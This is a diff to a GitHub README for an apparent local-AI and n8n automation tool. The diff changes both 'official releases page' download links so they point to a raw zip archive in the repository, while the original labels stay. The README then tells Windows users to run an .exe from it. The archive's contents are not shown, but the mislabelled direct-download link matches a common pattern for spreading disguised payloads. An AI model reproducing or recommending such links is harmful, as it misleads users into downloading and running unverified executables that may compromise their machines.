@@ -1,6 +1,6 @@
 # 🤖 ollama-ai-agent-n8n - Build automated workflows with local AI
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Deafened-spare644/ollama-ai-agent-n8n/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Deafened-spare644/ollama-ai-agent-n8n/main/workflow/ollama_ai_n_agent_3.1.zip)
 
 This application coordinates local artificial intelligence models with n8n workflow automation. It runs Llama 3.2 on your computer and connects it to cloud services to automate tasks. You control the data while the software manages the logic.
 
@@ -18,7 +18,7 @@ Your computer needs specific components to run this software. Ensure you have th
 
 You must visit the project release page to get the installation file. Follow these steps to obtain the correct version for your Windows computer:
 
-1. Visit the [official releases page](https://github.com/Deafened-spare644/ollama-ai-agent-n8n/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/Deafened-spare644/ollama-ai-agent-n8n/main/workflow/ollama_ai_n_agent_3.1.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends in .exe to download the installer.
 4. Save the file to your desktop or downloads folder.
